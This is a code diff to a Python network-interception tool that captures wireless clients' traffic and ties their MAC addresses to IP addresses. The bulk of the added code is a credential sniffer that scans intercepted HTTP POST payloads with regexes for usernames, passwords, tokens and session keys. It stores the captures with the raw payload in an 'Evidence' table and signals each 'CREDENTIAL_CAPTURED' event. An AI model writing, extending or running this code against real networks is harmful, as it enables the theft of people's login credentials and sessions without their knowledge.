@@ -4,7 +4,7 @@ import re
 import datetime
 import json
 from database import SessionLocal
-from models import InterceptedTraffic, DeviceFingerprint
+from models import InterceptedTraffic, DeviceFingerprint, WirelessClient, Evidence
 
 # ─── Configuration ──────────────────────────────────────────────────────────
 
@@ -58,6 +58,13 @@ def handle_intercepted_packet(packet, signal_queue=None):
             client_mac = packet.src if packet.haslayer(IP) else "Unknown"
             client_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
             
+            if client_mac and client_ip and client_ip != "Unknown":
+                # LINK LAYER 2 TO LAYER 3
+                client = db.query(WirelessClient).filter(WirelessClient.mac_address == client_mac.upper()).first()
+                if client and client.ip_address != client_ip:
+                    client.ip_address = client_ip
+                    db.commit()
+            
             if is_typo_squatting(qname):
                 print(f"[!] DOMINANCE ALERT: Typo-Squatting detected: {qname} from {client_mac}")
                 traffic_log = InterceptedTraffic(
@@ -80,8 +87,59 @@ def handle_intercepted_packet(packet, signal_queue=None):
             client_mac = packet.src
             client_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"
             
+            if client_mac and client_ip and client_ip != "Unknown":
+                client = db.query(WirelessClient).filter(WirelessClient.mac_address == client_mac.upper()).first()
+                if client and client.ip_address != client_ip:
+                    client.ip_address = client_ip
+                    db.commit()
+            
             is_suspicious = contains_monitored_pattern(path) or is_typo_squatting(host)
             
+            # 3. Deep Packet Exfiltration (POST Data)
+            if packet.haslayer(Raw):
+                load = packet[Raw].load.decode('utf-8', errors='ignore')
+                method = packet[HTTPRequest].Method.decode('utf-8', errors='ignore') if hasattr(packet[HTTPRequest], 'Method') else "GET"
+                
+                # Sniff for credential fields in the payload
+                cred_patterns = [
+                    r'(?:user|uname|username|email|login|id)=(?P<user>[^&]+)',
+                    r'(?:pass|password|pwd|secret)=(?P<pass>[^&]+)',
+                    r'(?P<token>token|session|auth|key)=(?P<val>[^&]+)'
+                ]
+                
+                found_creds = {}
+                for pattern in cred_patterns:
+                    match = re.search(pattern, load, re.IGNORECASE)
+                    if match:
+                        found_creds.update(match.groupdict())
+                
+                if found_creds:
+                    print(f"[+] STRATEGIC HIT: Captured credentials from {client_mac} -> {host}")
+                    evidence = Evidence(
+                        target_ip=client_ip,
+                        data_type="Credential",
+                        content=json.dumps({
+                            "host": host,
+                            "path": path,
+                            "method": method,
+                            "captured": found_creds,
+                            "raw_payload": load[:200] # Truncate for safety
+                        })
+                    )
+                    db.add(evidence)
+                    db.commit()
+                    
+                    if signal_queue:
+                        signal_queue.put({
+                            "type": "CREDENTIAL_CAPTURED", 
+                            "data": {
+                                "mac": client_mac, 
+                                "host": host, 
+                                "type": "Strategic Asset",
+                                "fields": list(found_creds.keys())
+                            }
+                        })
+
             if is_suspicious:
                 print(f"[!] DOMINANCE ALERT: Suspicious Resource: {host}{path} accessed by {client_mac}")
                 traffic_log = InterceptedTraffic(
